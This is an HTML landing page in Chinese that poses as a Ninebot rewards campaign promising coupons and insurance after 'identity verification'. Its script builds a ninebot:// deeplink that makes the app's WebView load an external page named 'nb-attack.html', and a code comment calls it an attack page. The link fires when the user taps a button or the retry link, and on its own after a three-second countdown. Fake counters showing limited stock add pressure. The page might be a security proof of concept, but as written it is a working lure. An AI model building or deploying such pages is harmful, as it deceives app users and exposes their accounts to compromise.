<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="format-detection" content="telephone=no">
<title>九号出行 · 骑行福利季</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Helvetica Neue",sans-serif;
       background:linear-gradient(160deg,#0d1120 0%,#1a2237 55%,#233252 100%);
       min-height:100vh;color:#fff;overflow-x:hidden;
       padding:calc(env(safe-area-inset-top) + 16px) 20px calc(env(safe-area-inset-bottom) + 28px)}
  .badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,149,0,.16);
         border:1px solid rgba(255,149,0,.4);color:#ffb340;font-size:12px;font-weight:600;
         padding:5px 12px;border-radius:999px;letter-spacing:1px}
  .hero{margin:22px 0 8px}
  .hero h1{font-size:30px;line-height:1.25;font-weight:800;letter-spacing:.5px}
  .hero h1 em{font-style:normal;background:linear-gradient(90deg,#ffb340,#ff7a00);
              -webkit-background-clip:text;background-clip:text;color:transparent}
  .hero p{margin-top:10px;font-size:14px;color:rgba(255,255,255,.62);line-height:1.7}
  .card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);
        border-radius:18px;padding:18px 16px;margin-top:20px;backdrop-filter:blur(8px)}
  .gift{display:flex;align-items:center;gap:14px;padding:12px 4px}
  .gift+.gift{border-top:1px dashed rgba(255,255,255,.12)}
  .gift .ico{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;
             justify-content:center;font-size:22px;background:rgba(255,149,0,.15)}
  .gift b{font-size:15px;display:block}
  .gift span{font-size:12px;color:rgba(255,255,255,.5);display:block;margin-top:3px}
  .count{display:flex;justify-content:space-between;align-items:center;margin-top:16px;
         font-size:12px;color:#ffb340}
  .bar{height:6px;border-radius:99px;background:rgba(255,255,255,.12);margin-top:8px;overflow:hidden}
  .bar i{display:block;height:100%;width:78%;border-radius:99px;
         background:linear-gradient(90deg,#ffb340,#ff7a00)}
  .cta{margin:26px 0 14px;display:block;width:100%;border:0;cursor:pointer;
       padding:17px 0;font-size:18px;font-weight:800;letter-spacing:2px;color:#1c1400;
       background:linear-gradient(135deg,#ffc043,#ff8a00);border-radius:16px;
       box-shadow:0 10px 28px rgba(255,138,0,.35);animation:pulse 2.2s infinite}
  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.025)}}
  .sub{text-align:center;font-size:12px;color:rgba(255,255,255,.45);line-height:1.8}
  .sub a{color:#7aa7ff;text-decoration:none}
  #jumplog{margin-top:18px;text-align:center;font-size:11px;color:rgba(255,255,255,.35);
           font-family:monospace;word-break:break-all}
</style>
</head>
<body>
  <div class="badge">⚡ 限时活动 · 8月专享</div>
  <div class="hero">
    <h1>骑行福利季<br><em>老用户专属回馈</em></h1>
    <p>完成身份核验即可领取以下三重礼遇，权益将自动发放至你的九号账户。</p>
  </div>

  <div class="card">
    <div class="gift"><div class="ico">🎫</div><div><b>30 天延保券</b><span>适用于已绑定车辆 · 限量 2000 份</span></div></div>
    <div class="gift"><div class="ico">🔋</div><div><b>电池 9 折保养卡</b><span>全国服务网点通用</span></div></div>
    <div class="gift"><div class="ico">🛡️</div><div><b>骑行意外险 · 1 个月</b><span>激活后自动生效</span></div></div>
    <div class="count"><span>已领取 7,842 份</span><span>剩 21.7%</span></div>
    <div class="bar"><i></i></div>
  </div>

  <button class="cta" id="go">立即打开 App 领取</button>
  <div class="sub">点击后将自动跳转 <b>九号出行 App</b> 完成核验<br>未安装？<a href="javascript:void(0)" id="retry">重试跳转</a> 或前往应用商店搜索「九号出行」</div>
  <div id="countdown" style="text-align:center;margin-top:16px;font-size:15px;color:#ffb340;font-weight:700"></div>
  <div id="jumplog"></div>

<script>
  // deeplink: 打开App内WebView并加载攻击页 (九号scheme)
  var ATTACK = "https://derham1999.github.io/ai-daily/nb-attack.html";
  var DL = "ninebot://ninebot.ninebot.com/openPage?destination=webview&parameters=" +
           encodeURIComponent(JSON.stringify({url: ATTACK}));
  var log = document.getElementById("jumplog");
  var cd = document.getElementById("countdown");
  function jump(tag){
    cd.innerHTML = "🚀 正在跳转九号App…";
    cd.style.fontSize = "18px";
    log.textContent = "[deeplink " + tag + "] " + DL.substring(0, 60) + "…";
    location.href = DL;
  }
  document.getElementById("go").addEventListener("click", function(){ jump("btn"); });
  document.getElementById("retry").addEventListener("click", function(){ jump("retry"); });
  // 倒计时3秒后自动跳转
  var n = 3;
  cd.textContent = "⏳ " + n + " 秒后自动打开 App…";
  var timer = setInterval(function(){
    n--;
    if(n > 0){ cd.textContent = "⏳ " + n + " 秒后自动打开 App…"; }
    else { clearInterval(timer); jump("auto"); }
  }, 1000);
</script>
</body>
</html>
